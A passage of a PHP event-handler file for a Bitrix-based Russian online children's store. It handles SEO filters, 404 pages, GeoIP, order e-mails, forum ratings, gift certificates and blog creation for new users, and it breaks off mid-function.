                    $GLOBALS["SET_SEO"] = array("type"=>"producer", "DATA"=>$arP);


                } else $GLOBALS["SET_SEO"]["IS404"] = "Y";
            } elseif(strlen($_REQUEST["propertyCode"])>0) {
                CModule::IncludeModule("iblock");
                $rsP = CIBlockElement::GetList(Array(), array("IBLOCK_ID"=>17, "CODE"=>$_REQUEST["propertyCode"]), false, false, array("ID", "NAME", "CODE", "PREVIEW_TEXT", "DETAIL_TEXT", "PROPERTY_BREADCRUMB_TITLE"));
                if($arP = $rsP -> GetNext())
                {
                    $_REQUEST["set_filter"] = 'Y';
                    $_REQUEST["arrLeftFilter_pf"][$arP["DETAIL_TEXT"]][] = $arP["PREVIEW_TEXT"];

                    $arP["ENUM"] = CIBlockPropertyEnum::GetByID($arP["PREVIEW_TEXT"]);


                    $GLOBALS["SET_SEO"] = array("type"=>"property", "DATA"=>$arP);
                } else $GLOBALS["SET_SEO"]["IS404"] = "Y";
            }
        }

        /*if(!$USER->IsAdmin() || true)
        {
        if(preg_match("/\/catalog\/\d+\//", $APPLICATION->GetCurPage()) || preg_match("/\/catalog\/\.*\/.*+//", $APPLICATION->GetCurPage()))
        {
        if($_GET["set_filter"] != "Y" && !isset($_GET["orderby"]) && !isset($_GET["PAGEN_1"]) && count($_GET)>0)
        {

        $APPLICATION->RestartBuffer();
        @define("ERROR_404", "Y");
        require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
        require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_after.php");
        require($_SERVER['DOCUMENT_ROOT'].'/404.php');
        die();
        }
        }
        }*/
    }

    AddEventHandler("main", "OnProlog", "OnPrologHandler");
    function OnPrologHandler() {
        global $APPLICATION;

        if(!(substr_count($APPLICATION->GetCurDir(),"bitrix") > 0)) {
            require_once($_SERVER["DOCUMENT_ROOT"].'/bitrix/php_interface/include/CGeoIP.php');
            global $CGeoIP;
            $CGeoIP = new CGeoIP();
            if(isset($_POST["setLocation"]) && !empty($_POST["locationSelect"])) {
                $CGeoIP -> setBitrixCityData(array("city" => $_POST["locationSelect"]), true);
            }
        }
    }

    AddEventHandler("main", "OnEpilog", "OnEpilogHandler");
    function OnEpilogHandler()
    {
        if(defined('ERROR_404') && ERROR_404 == 'Y')
        {
            global $APPLICATION;
            $APPLICATION->RestartBuffer();

            require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
            include $_SERVER['DOCUMENT_ROOT'].'/bitrix/templates/nmg/header.php';
            include $_SERVER['DOCUMENT_ROOT'].'/404.php';
            include $_SERVER['DOCUMENT_ROOT'].'/bitrix/templates/nmg/footer.php';
        }
    }

    function show404()
    {
        @define("ERROR_404", "Y");
    }



    function showBreadcrumb($strBreadcrumb)
    {
        return '<div class="sorting_block"><div class="show_block">'.$strBreadcrumb.'</div></div>';
    }

    class ForumRe{

        function onAfterMessageDeleteHandler($id,$arFields){

            if($arFields["FORUM_ID"]==FORUM_ID)
            {
                $id_tovar = $arFields["PARAM2"];
                $id_topic = $arFields["TOPIC_ID"];

                IForumMessageRating::IDelRating($id);
                UpdateRatingForTovar($arFields["PARAM2"],$arFields["TOPIC_ID"], $id);
                CacheRatingReviews::GetByID($arFields["PARAM2"],"Y");
            }
        }

        function onAfterTopicDeleteHandler($id, $arFields)
        {
            CModule::IncludeModule("iblock");

            if($arFields["FORUM_ID"]==FORUM_ID)
            {
                $id_tovar = 0;
                $arFilter = Array(
                    "IBLOCK_ID"=>CATALOG_IBLOCK_ID,
                    "ACTIVE"=>"Y",
                    "PROPERTY_FORUM_TOPIC_ID"=>$arFields["ID"]
                );
                $res = CIBlockElement::GetList(Array("SORT"=>"ASC"), $arFilter, false,false,array("ID"));
                while($ar_fields = $res->GetNext())
                    $id_tovar = $ar_fields["ID"];

                if($id_tovar>0)
                {
                    UpdateRatingForTovar($id_tovar);
                    CacheRatingReviews::GetByID($id_tovar,"Y");
                }
            }
        }

    }


    class Events {

        function OnBeforeEventAddHandler(&$Event, &$ar_fields, &$val)
        {
            global $USER;

            if(preg_match("/^SALE_STATUS_CHANGED.*?$/is",$Event) || $Event=="SALE_ORDER_PAID")
            {
                if(isset($val["ORDER_ID"]))
                {
                    if ($arOrder = CSaleOrder::GetByID($val["ORDER_ID"]))
                    {
                        CModule::IncludeModule("sale");

                        //get additional info
                        $arResult["ORDER"] = CSaleOrder::GetByID($val["ORDER_ID"]);

                        if($arResult["ORDER"]["PAY_SYSTEM_ID"]>0)
                            $arResult["ORDER"]["PAY_SYSTEM"] = CSalePaySystem::GetByID($arResult["ORDER"]["PAY_SYSTEM_ID"], $arResult["ORDER"]["PERSON_TYPE_ID"]);

                        if($arResult["ORDER"]["DELIVERY_ID"]>0)
                            $arResult["ORDER"]["DELIVERY"] = CSaleDelivery::GetByID($arResult["ORDER"]["DELIVERY_ID"]);

                        $rsProp = CSaleOrderPropsValue::GetOrderProps($arResult["ORDER"]["ID"]);
                        while($arProp = $rsProp -> GetNext())
                        {
                            if($arProp["ORDER_PROPS_ID"] == 4)
                                $arProp["VALUE"] = CSaleLocation::GetByID($arProp["VALUE"]);

                            $arResult["ORDER"]["PROP"][$arProp["ORDER_PROPS_ID"]] = $arProp;
                        }

                        $val = array_merge($val, array(
                            "ADDRESS" => $arResult["ORDER"]["PROP"][4]["VALUE"]["COUNTRY_NAME_LANG"].', '.$arResult["ORDER"]["PROP"][4]["VALUE"]["CITY_NAME_LANG"].', '.$arResult["ORDER"]["PROP"][6]["VALUE"],
                            "PHONE" => $arResult["ORDER"]["PROP"][3]["VALUE"],
                            "CONTACT2" => $arResult["ORDER"]["PROP"][8]["VALUE"],
                            "PHONE2" => $arResult["ORDER"]["PROP"][9]["VALUE"],
                            "DELIVERY_DATE" => $arResult["ORDER"]["PROP"][10]["VALUE"],
                            "PAY_SYSTEM" => $arResult["ORDER"]["PAY_SYSTEM"]["NAME"],
                            "DELIVERY" => $arResult["ORDER"]["DELIVERY"]["NAME"]
                            )
                        );

                        $rsUser = CUser::GetByID($arOrder["USER_ID"]);
                        $arUser = $rsUser->Fetch();

                        $name = "";
                        if(strlen($arUser["NAME"])>0) $name .= $arUser["NAME"];
                        if(strlen($arUser["LAST_NAME"])>0) $name .= (strlen($name)>0?' ':'').$arUser["LAST_NAME"];

                        if(strlen($name)<=0)
                            $name = $arUser["LOGIN"];

                        $val["NAME"] = $name;
                    }
                }
            }
        }

        function OnAfterUserLogoutHandler($arParams){
            if(isset($_SESSION["PRODUCTS"])){
                unset($_SESSION["PRODUCTS"]);
            }
        }

        function OnBeforeIBlockElementUpdateHandler(&$element)
        {
            //дополнительная проверка активности для ТП
            if ($element["IBLOCK_ID"] == 3) {
                if (checkSKUactive($element["ID"]) == "N") {
                    $element["ACTIVE"] = "N";
                }
            }

            return $element;

            /*
            if(empty($_SERVER["DOCUMENT_ROOT"])) $_SERVER["DOCUMENT_ROOT"] = "/data/mamingorodok.ru/docs";

            $totime = time();
            if($element["IBLOCK_ID"]==CATALOG_IBLOCK_ID)
            {
            $ID = $element["ID"];

            $defaultPicture = $_SERVER["DOCUMENT_ROOT"]."/upload/import/default/1.jpg";
            $set_new_picture = "N";
            $res = CIBlockElement::GetList(array(), array("IBLOCK_ID"=>CATALOG_IBLOCK_ID, "ID"=>$element["ID"]), false, false, array("TIMESTAMP_X","PREVIEW_PICTURE","DETAIL_PICTURE"));
            if($ar_fields = $res->Fetch())
            {
            $timestamp_x = $ar_fields["TIMESTAMP_X"];
            $PREVIEW_PICTURE = $ar_fields["PREVIEW_PICTURE"];
            $DETAIL_PICTURE = $ar_fields["DETAIL_PICTURE"];
            $timestamp = str_replace(",",".",$timestamp_x);
            $dt = explode(" ",$timestamp);
            $date = explode(".",$dt[0]);
            $time = explode(":",$dt[1]);
            $timestamp = mktime($time[0],$time[1],$time[2],$date[1],$date[0],$date[2]);
            }

            if(!empty($element["XML_ID"]))
            {
            $folderPicture = $_SERVER["DOCUMENT_ROOT"]."/upload/import/goods_files/".$element["XML_ID"]."/";
            if(is_dir($folderPicture))
            {
            global $watermark, $watermarkPicture, $temps;
            //include_once $_SERVER["DOCUMENT_ROOT"]."/bitrix/auxiliary/api.watermark.php";
            // $watermark = new watermark();
            // $watermarkPicture = $_SERVER["DOCUMENT_ROOT"]."/upload/import/default/watermark.png";
            $temps = $_SERVER["DOCUMENT_ROOT"]."/upload/import/temp/";
            $oneday = 60*60*24;
            //$totime =  $totime;
            $fromtime = $timestamp;
            //if($totime <= 0)
            // $totime = time();
            $day = ($totime - $fromtime)/$oneday;
            $day = ceil(abs($day))+1;
            if($day<1) $day = 1;
            //$day = str_replace(",", ".", $day);
            //$day +=0.5;
            //echo $day;
            //echo $folderPicture;
            $files = array();
            //$command = "find ".$folderPicture." -type f -mtime -".$day." -iregex  '.*\/[0-9]+?\.\(jpg\|gif\|png\|bmp\|jpeg\)$' ";
            $command = "find ".$folderPicture." -type f -iregex  '.*\/[0-9]+?\.\(jpg\|gif\|png\|bmp\|jpeg\)$' | sort";
            $a = exec($command, $files);
            $files = sortFiles($files);

            $upd_nabor = false;
            $set_new_picture = "N";

            if(is_array($files))
            {
            // check files hash
            $arFileHash = array();
            foreach($files as $file)
            $arFileHash[] = trim($file."|".filesize($file));

            // get hash
            $strFileHash = '';
            $rsFH = CIBlockElement::GetProperty($element["IBLOCK_ID"], $element["ID"], array("sort" => "asc"), Array("CODE"=>"PHASH"));
            if($arFH = $rsFH -> Fetch()) $strFileHash = $arFH["VALUE"];

            $strCurrentPicHash = md5(implode("::", $arFileHash));
            if($strCurrentPicHash != $strFileHash)
            {
            $GLOBALS["UPDATE_HACK_AFTER"][$ID]["PHASH"] = $strCurrentPicHash;
            foreach($files as $file)
            {
            if($timestamp-3600<filemtime($file)) // если файл был изменен после обновления элемента - обрабатывем его 3600 - на разницу во времени до 1 часа
            {
            $res = explode($folderPicture, $file);
            if(isset($res[1]) && !empty($res[1])) // главная картинка
            {

            if(preg_match("/^1\.(jpg|gif|png|bmp|jpeg)?/is",$res[1]))
            {
            $tmpfl = $temps."prewiew_".$XML_ID."_".$res[1];
            $filePicFull = CFile::MakeFileArray($file);

            if(copy($file, $tmpfl))
            {
            $filePic = CFile::MakeFileArray($tmpfl);

            $filePic  = CIBlock::ResizePicture($filePic ,array(
            "WIDTH" => 160,
            "HEIGHT" => 160,
            "COMPRESSION" => 100,
            "SCALE" => "Y",
            "METHOD" => "resample"
            ));
            }

            if(is_array($PREVIEW_PICTURE) && isset($PREVIEW_PICTURE["ID"]))
            $PREVIEW_PICTURE = $PREVIEW_PICTURE["ID"];
            $PREVIEW_PICTURE = intval($PREVIEW_PICTURE);
            if($PREVIEW_PICTURE>0)
            CFile::Delete($PREVIEW_PICTURE);

            if(is_array($DETAIL_PICTURE) && isset($DETAIL_PICTURE["ID"]))
            $DETAIL_PICTURE = $DETAIL_PICTURE["ID"];
            $DETAIL_PICTURE = intval($DETAIL_PICTURE);
            if($DETAIL_PICTURE>0)
            CFile::Delete($DETAIL_PICTURE);

            $element["PREVIEW_PICTURE"] = $filePic;
            $element["DETAIL_PICTURE"] = $filePicFull;
            $set_new_picture = "Y";
            } elseif(preg_match("/(2|3|4|5|6|7|8|9|10|11|12)+?\.(jpg|gif|png|bmp|jpeg)/is",$res[1])) {
            $upd_nabor = true; // обновление файлов в свойствах
            }
            }
            }
            }
            }
            }

            if($upd_nabor)
            {
            $files = array();
            $command = "find ".$folderPicture." -type f -iregex  '.*?goods_files\/.*?\/\(2\|3\|4\|5\|6\|7\|8\|9\|10\|11\|12\)+?\.\(jpg\|gif\|png\|bmp\|jpeg\)$' ";
            $a = exec($command, $files);
            $files = sortFiles($files);

            $COLOR_PROPERTY_FILE = 'IMG_BIG';
            $element["PROPERTY_VALUES"][$COLOR_PROPERTY_FILE] = array();
            $addFile = array();
            if(is_array($files))
            {
            foreach($files as $file)
            {
            if(!in_array($file, $addFile))
            {
            $addFile[] = $file;
            $filePicFull = CFile::MakeFileArray($file);
            $element["PROPERTY_VALUES"][$COLOR_PROPERTY_FILE][] =  $filePicFull;
            }
            }
            }

            if(count($element["PROPERTY_VALUES"][$COLOR_PROPERTY_FILE])>0)
            {
            $arTmpFileDel = array();
            $db_props = CIBlockElement::GetProperty(CATALOG_IBLOCK_ID, $ID, array("sort" => "asc"), Array("CODE"=>$COLOR_PROPERTY_FILE));
            while($ar_props = $db_props->Fetch())
            {
            $element["PROPERTY_VALUES"][$COLOR_PROPERTY_FILE][$ar_props["PROPERTY_VALUE_ID"]] = array("VALUE" => array("del"=>"Y"));
            $arTmpFileDel[$ar_props["PROPERTY_VALUE_ID"]] = array(
            "name" => "",
            "type" => "",
            "tmp_name" => "",
            "error" => 4,
            "size" => 0,
            "del" => "Y"
            );
            }
            CIBlockElement::SetPropertyValues($ID, CATALOG_IBLOCK_ID, $arTmpFileDel, $COLOR_PROPERTY_FILE);
            }
            }

            }
            }



            if($set_new_picture!="Y")
            {
            if(isset($PREVIEW_PICTURE["ID"])){
            $rsFile = CFile::GetByID($PREVIEW_PICTURE["ID"]);
            if($arFile = $rsFile->Fetch())
            $element["PREVIEW_PICTURE"] = $arFile;
            //else
            //$defaultPicture
            }
            elseif(intval($PREVIEW_PICTURE)>0){
            //print_R($element["PREVIEW_PICTURE"]);
            //echo "<br><br>";
            $rsFile = CFile::GetByID($PREVIEW_PICTURE);
            if($arFile = $rsFile->Fetch()){
            //die(print_R($arFile));
            $element["PREVIEW_PICTURE"] = $arFile;
            }
            }
            else{
            $element["PREVIEW_PICTURE"] = CFile::MakeFileArray($defaultPicture);
            }


            if(isset($DETAIL_PICTURE["ID"])){
            $rsFile = CFile::GetByID($DETAIL_PICTURE["ID"]);
            if($arFile = $rsFile->Fetch())
            $element["DETAIL_PICTURE"] = $arFile;
            }elseif(intval($DETAIL_PICTURE)>0){
            $rsFile = CFile::GetByID($DETAIL_PICTURE);
            if($arFile = $rsFile->Fetch())
            $element["DETAIL_PICTURE"] = $arFile;
            }
            else
            $element["DETAIL_PICTURE"] = CFile::MakeFileArray($defaultPicture);
            }

            // save detail pic description     for automatic update
            if($element["DETAIL_PICTURE"]["size"]>0)
            { // http://mamingorodok.ru/bitrix/admin/iblock_element_edit.php?WF=Y&ID=12266&type=catalog&lang=ru&IBLOCK_ID=2&find_section_section=319
            $arDetailPicture = CFile::GetFileArray($ar_fields["DETAIL_PICTURE"]);
            if(strlen($arDetailPicture["DESCRIPTION"])>0)
            $element["DETAIL_PICTURE"]["description"] = $arDetailPicture["DESCRIPTION"];
            }

            //echo '<pre>'.print_r($element["PROPERTY_VALUES"][$COLOR_PROPERTY_FILE], true).'</pre>';
            //die();

            // идет полное обновление свойств - даже при обновлении одной картинки. нам это в импорте не нужно, поэтому перекидываем свойства в after update hook и обновляем только те, что заданы, остальные не трогаем
            if(isset($element["PROPERTY_VALUES"]))
            {
            $GLOBALS["UPDATE_HACK"][$ID] = $element["PROPERTY_VALUES"];
            unset($element["PROPERTY_VALUES"]);
            }


            unset($defaultPicture);
            unset($arFile);
            unset($rsFile);
            unset($PREVIEW_PICTURE);
            unset($db_props);
            unset($ar_props);
            unset($a);
            unset($command);
            unset($files);
            unset($filePic);
            unset($filePicFull);
            unset($res);
            unset($ar_fields);
            unset($totime);
            unset($day);
            unset($timestamp);
            unset($timestamp_x);
            }



            if($element["IBLOCK_ID"] == OFFERS_IBLOCK_ID)
            {
            $res = CIBlockElement::GetList(array(),array("IBLOCK_ID"=>OFFERS_IBLOCK_ID, "ID"=>$element["ID"]), false, false, array("TIMESTAMP_X","PROPERTY_CML2_LINK","PROPERTY_COLOR_CODE","PROPERTY_PICTURE_MINI","PROPERTY_PICTURE_MIDI","PROPERTY_PICTURE_MAXI"));
            if($ar_fields = $res->GetNext())
            {
            $timestamp_x = $ar_fields["TIMESTAMP_X"];
            $timestamp = str_replace(",",".",$timestamp_x);
            $dt = explode(" ", $timestamp);

            $date = explode(".",$dt[0]);
            $time = explode(":",$dt[1]);

            $timestamp = mktime($time[0],$time[1],$time[2],$date[1],$date[0],$date[2]); // дата изменения элемента unix like
            $main_product = intval($ar_fields["PROPERTY_CML2_LINK_VALUE"]);
            $COLOR_CODE = trim($ar_fields["PROPERTY_COLOR_CODE_VALUE"]);
            $MINI_OLD = $ar_fields["PROPERTY_PICTURE_MINI_VALUE"];
            $MIDI_OLD = $ar_fields["PROPERTY_PICTURE_MIDI_VALUE"];
            $MAXI_OLD = $ar_fields["PROPERTY_PICTURE_MAXI_VALUE"];
            }

            if($main_product>0)
            {
            $res = CIBlockElement::GetList(array(),array("IBLOCK_ID"=>CATALOG_IBLOCK_ID, "ID"=>$main_product), false, false, array("XML_ID"));
            if($ar_fields = $res->GetNext())
            {
            $XML_ID = $ar_fields["XML_ID"];
            if(strlen($XML_ID)>0)
            $folderPicture = $_SERVER["DOCUMENT_ROOT"]."/upload/import/goods_files/".$XML_ID."/";
            else $folderPicture = "";
            }

            if(!empty($XML_ID))
            {
            $MINI = "";
            $MIDI = "";
            $MAXI = "";

            if(is_dir($folderPicture))
            {
            global $watermark, $watermarkPicture, $temps;
            $temps = $_SERVER["DOCUMENT_ROOT"]."/upload/import/temp/";

            if(strlen($COLOR_CODE) <= 0)
            {
            if(strlen($element["PROPERTY_VALUES"]["COLOR_CODE"])>0)
            $COLOR_CODE = $element["PROPERTY_VALUES"]["COLOR_CODE"];
            elseif(isset($element["PROPERTY_VALUES"]["20"])) {
            foreach($element["PROPERTY_VALUES"]["20"] as $val)
            $COLOR_CODE  = $val["VALUE"];
            }
            }

            if(strlen($COLOR_CODE)<=0)
            {
            $db_props = CIBlockElement::GetProperty(OFFERS_IBLOCK_ID, $element["ID"], array("sort" => "asc"), Array("CODE"=>"COLOR_CODE"));
            while($ar_props = $db_props->Fetch())
            $COLOR_CODE = $ar_props["VALUE"];
            }

            $strMAXIName = '';
            $arFiles = getFileDir($folderPicture);
            if(is_array($arFiles) && count($arFiles)>0)
            {
            // get hash
            $strFileHash = '';
            $rsFH = CIBlockElement::GetProperty($element["IBLOCK_ID"], $element["ID"], array("sort" => "asc"), Array("CODE"=>"PICHASH"));
            if($arFH = $rsFH -> Fetch()) $strFileHash = $arFH["VALUE"];

            $strCurrentPicHash = md5(implode("::", $arFileHash));
            if($strCurrentPicHash != $strFileHash)
            {
            foreach($arFiles as $strFileName)
            {
            if(preg_match("/^.*?".$COLOR_CODE."\.(jpg|gif|png|bmp|jpeg)+?$/i", $strFileName))
            {
            if(filectime($folderPicture.$strFileName) > $timestamp) // файл был закачан после последнего изменения элемента - апдейтим
            {
            if(strpos($strFileName, "MINI") === 0)
            $MINI = CFile::MakeFileArray($folderPicture.$strFileName);
            elseif(strpos($strFileName, "MIDI") === 0)
            $MIDI = CFile::MakeFileArray($folderPicture.$strFileName);
            else {
            $MAXI = CFile::MakeFileArray($folderPicture.$strFileName);
            $strMAXIName = $strFileName;
            }
            }
            }
            }
            $GLOBALS["UPDATE_HACK_AFTER"][$ID]["PHASH"] = $strCurrentPicHash;
            }
            }
            }


            if(is_array($MAXI) && !is_array($MIDI)) $MIDI = CIBlock::ResizePicture(array_merge($MAXI, array("COPY_FILE"=>"Y")), array("WIDTH"=>256, "HEIGHT"=>256, "METHOD"=>"resample", "COMPRESSION"=>95));
            if(is_array($MAXI) && !is_array($MINI)) $MINI = CIBlock::ResizePicture(array_merge($MAXI, array("COPY_FILE"=>"Y")), array("WIDTH"=>64, "HEIGHT"=>64, "METHOD"=>"resample", "COMPRESSION"=>95));

            if(is_array($MINI)) CIBlockElement::SetPropertyValuesEx($element["ID"], OFFERS_IBLOCK_ID, array("PICTURE_MINI" => array($MINI)));
            if(is_array($MIDI)) CIBlockElement::SetPropertyValuesEx($element["ID"], OFFERS_IBLOCK_ID, array("PICTURE_MIDI" => array($MIDI)));
            if(is_array($MAXI)) CIBlockElement::SetPropertyValuesEx($element["ID"], OFFERS_IBLOCK_ID, array("PICTURE_MAXI" => array($MAXI)));
            }
            }

            unset($defaultPicture);
            unset($arFile);
            unset($rsFile);
            unset($PREVIEW_PICTURE);
            unset($db_props);
            unset($ar_props);
            unset($a);
            unset($command);
            unset($files);
            unset($filePic);
            unset($filePicFull);
            unset($res);
            unset($ar_fields);
            unset($totime);
            unset($day);
            unset($timestamp);
            unset($MAXI_OLD);
            unset($arFile3);
            unset($MAXI);
            unset($MIDI_OLD);
            unset($arFile2);
            unset($MIDI);
            unset($arFile);
            unset($MINI);
            }

            if($element["IBLOCK_ID"] == 15) {
            $element["ACTIVE_FROM"] = substr($element["ACTIVE_FROM"], 0, 10);
            }

            */
        }

        function OnSalePayOrderHandler($id,$res){
            global $DB;
            if($res=="Y"){
                if ($arOrder = CSaleOrder::GetByID($id)){
                    if(!empty($arOrder["USER_DESCRIPTION"]) && preg_match("/^certificate.*?$/is",$arOrder["USER_DESCRIPTION"])){
                        //die(print_r($arOrder));
                        if (!CModule::IncludeModule("iblock"))
                            return;
                        $zn = explode("_",$arOrder["USER_DESCRIPTION"]);
                        if(isset($zn[1])){
                            if($zn[1]=="me"){
                                $dbBasketItems = CSaleBasket::GetList(array(),array("ORDER_ID"=>$id),false,false,array("*"));
                                while ($arItems = $dbBasketItems->Fetch()){
                                    //<!----
                                    $arFields = array();

                                    $db_props = CIBlockElement::GetList(array(),array("IBLOCK_ID"=>CERTIFICATES_IBLOCK_ID, "ID"=>$arItems["PRODUCT_ID"]) , false, false);
                                    $i1=0;
                                    if($ar_props = $db_props->GetNextElement()){
                                        $val = $ar_props->GetProperties();
                                        if(isset($val["HAVE"]) && is_array($val["HAVE"])){
                                            foreach($val["HAVE"]["VALUE"] as $k=>$v){


                                                $arFields[$val["HAVE"]["ID"]][$val["HAVE"]["PROPERTY_VALUE_ID"][$k]] = array(
                                                    "VALUE"=>$v,
                                                    "DESCRIPTION"=>$val["HAVE"]["DESCRIPTION"][$k]
                                                );

                                                if($v==$arOrder["USER_ID"]){
                                                    $i1++;
                                                    $val1 = $val["HAVE"]["DESCRIPTION"][$k] + $arItems["QUANTITY"];
                                                    $arFields[$val["HAVE"]["ID"]][$val["HAVE"]["PROPERTY_VALUE_ID"][$k]] = array(
                                                        "VALUE"=>$v,
                                                        "DESCRIPTION"=>$val1);
                                                }

                                            }
                                            $idHave = $val["HAVE"]["ID"];
                                            if($i1==0){
                                                $arFields[$idHave][] = array(
                                                    "VALUE"=>$arOrder["USER_ID"],
                                                    "DESCRIPTION"=>intval($arItems["QUANTITY"])
                                                );
                                            }
                                        }
                                    }
                                    CIBlockElement::SetPropertyValuesEx($arItems["PRODUCT_ID"] , CERTIFICATES_IBLOCK_ID, $arFields);

                                    //<!----
                                }
                            }
                            elseif($zn[1]=="for"){
                                if (!CModule::IncludeModule("blog")){
                                    //echo "noblog";
                                    return;
                                }
                                if(isset($zn[2]) && intval($zn[2])>0){
                                    $user = intval($zn[2]);
                                    $dbBasketItems = CSaleBasket::GetList(array(),array("ORDER_ID"=>$id),false,false,array("*"));
                                    while ($arItems = $dbBasketItems->Fetch()){
                                        //<!----
                                        $arFields = array();

                                        $db_props = CIBlockElement::GetList(array(),array("IBLOCK_ID"=>CERTIFICATES_IBLOCK_ID, "ID"=>$arItems["PRODUCT_ID"]) , false, false);
                                        $i1=0;
                                        if($ar_props = $db_props->GetNextElement()){
                                            $val = $ar_props->GetProperties();
                                            if(isset($val["HAVE"]) && is_array($val["HAVE"])){
                                                foreach($val["HAVE"]["VALUE"] as $k=>$v){


                                                    $arFields[$val["HAVE"]["ID"]][$val["HAVE"]["PROPERTY_VALUE_ID"][$k]] = array(
                                                        "VALUE"=>$v,
                                                        "DESCRIPTION"=>$val["HAVE"]["DESCRIPTION"][$k]
                                                    );

                                                    if($v==$user){
                                                        $i1++;
                                                        $val1 = $val["HAVE"]["DESCRIPTION"][$k] + $arItems["QUANTITY"];
                                                        $arFields[$val["HAVE"]["ID"]][$val["HAVE"]["PROPERTY_VALUE_ID"][$k]] = array(
                                                            "VALUE"=>$v,
                                                            "DESCRIPTION"=>$val1);
                                                    }

                                                }
                                                $idHave = $val["HAVE"]["ID"];
                                                if($i1==0){
                                                    $arFields[$idHave][] = array(
                                                        "VALUE"=>$user,
                                                        "DESCRIPTION"=>intval($arItems["QUANTITY"])
                                                    );
                                                }
                                            }
                                        }
                                        CIBlockElement::SetPropertyValuesEx($arItems["PRODUCT_ID"] , CERTIFICATES_IBLOCK_ID, $arFields);
                                        //<!----

                                        $el = new CIBlockElement;
                                        $arLoadProductArray = Array(
                                            "IBLOCK_ID"=>CERTIFICATES_PRESENT_IBLOCK_ID,
                                            "PROPERTY_VALUES"=> array(
                                                "CERTIFICATE_ID"=>$arItems["PRODUCT_ID"],
                                                "USER_BY"=>$arOrder["USER_ID"],
                                                "USER_PRESENT"=>$user,
                                                "STATUS"=>CERTIFICATE_STATUS_OK
                                            ),
                                            "NAME"           => "Подарок от ".$this_user." для ".$forUser." ".$idsh,
                                            "ACTIVE"         => "Y",
                                        );
                                        if($PRODUCT_ID = $el->Add($arLoadProductArray)) {
                                            //echo "New ID: ".$PRODUCT_ID;
                                            $type = new IBlogType;

                                            //$newID = CBlogPost::Add($arFields);
                                            $certif = array();
                                            $certif["USER_TO"] = $arOrder["USER_ID"];
                                            $certif["USER_FROM"] = $user;
                                            $certif["CERTIFICATE"] = $arItems["PRODUCT_ID"];
                                            $certif = serialize($certif);
                                            $arBlog = CBlog::GetByOwnerID($arOrder["USER_ID"]);
                                            if(is_array($arBlog)){
                                                $arFields = array(
                                                    "TITLE" => 'CERTIFICATES #'.$PRODUCT_ID,
                                                    "DETAIL_TEXT" => $certif,
                                                    "BLOG_ID" => $arBlog["ID"],
                                                    "AUTHOR_ID" => $arOrder["USER_ID"],
                                                    "=DATE_CREATE" => $DB->GetNowFunction(),
                                                    "PUBLISH_STATUS" => BLOG_PUBLISH_STATUS_PUBLISH,
                                                    "ENABLE_TRACKBACK" => 'N',
                                                    "ENABLE_COMMENTS" => 'Y'
                                                );

                                                $newID = CBlogPost::Add($arFields);
                                                if(IntVal($newID)>0){
                                                    $type->ISetType($newID,CERTIFICATE_TYPE);
                                                    //echo "Новое сообщение [".$newID."] добавлено.";

                                                }
                                                //else
                                                //    if ($ex = $APPLICATION->GetException())
                                                //    echo $ex->GetString();

                                            }
                                            $arBlog = CBlog::GetByOwnerID($user);
                                            if(is_array($arBlog)){
                                                $arFields = array(
                                                    "TITLE" => 'CERTIFICATES #'.$PRODUCT_ID,
                                                    "DETAIL_TEXT" => $certif,
                                                    "BLOG_ID" => $arBlog["ID"],
                                                    "AUTHOR_ID" => $user,
                                                    "=DATE_CREATE" => $DB->GetNowFunction(),
                                                    "PUBLISH_STATUS" => BLOG_PUBLISH_STATUS_PUBLISH,
                                                    "ENABLE_TRACKBACK" => 'N',
                                                    "ENABLE_COMMENTS" => 'Y'
                                                );

                                                $newID = CBlogPost::Add($arFields);
                                                if(IntVal($newID)>0){
                                                    $type->ISetType($newID,CERTIFICATE_TYPE);
                                                    //echo "Новое сообщение [".$newID."] добавлено.";

                                                }
                                                //else
                                                //if ($ex = $APPLICATION->GetException())
                                                //echo $ex->GetString();

                                            }
                                        }
                                        //else
                                        //echo "Error: ".$el->LAST_ERROR;
                                    }

                                    //ToDo: добавление в блог!!!
                                }
                            }
                        }
                    }
                }
            }
        }

        function OnBeforePostAddHandler(&$arFields)
        {
            // подменяем id блога на выбранный в селекте на стронице добавления поста
            if ($_REQUEST["selected_blog_id"] > 0)
                $arFields["BLOG_ID"] = $_REQUEST["selected_blog_id"];
        }

        function OnBeforeBasketAddHandler(&$f){
            if(isset($_SESSION["PRODUCTS"][$f["PRODUCT_ID"]]) && is_array($_SESSION["PRODUCTS"][$f["PRODUCT_ID"]])){
                unset($_SESSION["PRODUCTS"][$f["PRODUCT_ID"]]);
            }
        }

        function OnAfterUserAddHandler(&$arFields)
        {
            global $DB, $APPLICATION;
            if($arFields["ID"]>0)
            {
                //отправка письма
                CUser::SendUserInfo($arFields["ID"],SITE_ID);

                if (CModule::IncludeModule("blog")):

                    $name = "";//$arFields["LAST_NAME"]."_".$arFields["NAME"];
                    if(!empty($arFields["LAST_NAME"])){
                        $name = $arFields["LAST_NAME"];
                    }
                    if(!empty($arFields["NAME"])){
                        if(!empty($name)){
                            $name .="_".$arFields["NAME"];
                        }
                        else
                            $name = $arFields["NAME"];
                    }

                    if(empty($name)){
                        if(!empty($arFields["EMAIL"])){
                            $login = explode("@",$arFields["EMAIL"]);
                            if(isset($login[0])){
                                $name = $login[0];
                            }
                        }
                    }

                    if(empty($name)){
                        $name = "user".$arFields["ID"];
                    }

                    $name = str2url($name);

                    $SORT = Array("DATE_CREATE" => "DESC", "NAME" => "ASC");
                    $arFilter = Array(
                        "ACTIVE" => "Y",
                        "GROUP_SITE_ID" => SITE_ID,
                        "URL" => $name
                    );
                    $arSelectedFields = array("ID", "NAME", "DESCRIPTION", "URL", "OWNER_ID", "DATE_CREATE");

                    $dbBlogs = CBlog::GetList(
                        $SORT,
                        $arFilter,
                        false,
                        false,
                        $arSelectedFields
                    );

                    if($arBlog = $dbBlogs->Fetch())
                    {
                        $name .= $arFields["ID"];
                    }

                    $arFields21 = array(
                        "USER_ID" => $arFields["ID"],
                        "=DATE_REG" => $GLOBALS["DB"]->GetNowFunction(),
                        "=DATE_REG" => $GLOBALS["DB"]->GetNowFunction(),
                        "ALLOW_POST" => "Y",
                    );


                    $newID21 = CBlogUser::Add($arFields21);

                    if(IntVal($newID21)>0)
                    {
                        //echo $newID21;
                        //$newID21 = intval($newID21);
                        $arFieldsBlog = array(
                            "NAME" => 'Блог',
                            "DESCRIPTION" => '',
                            "GROUP_ID" => BLOG_GROUP,
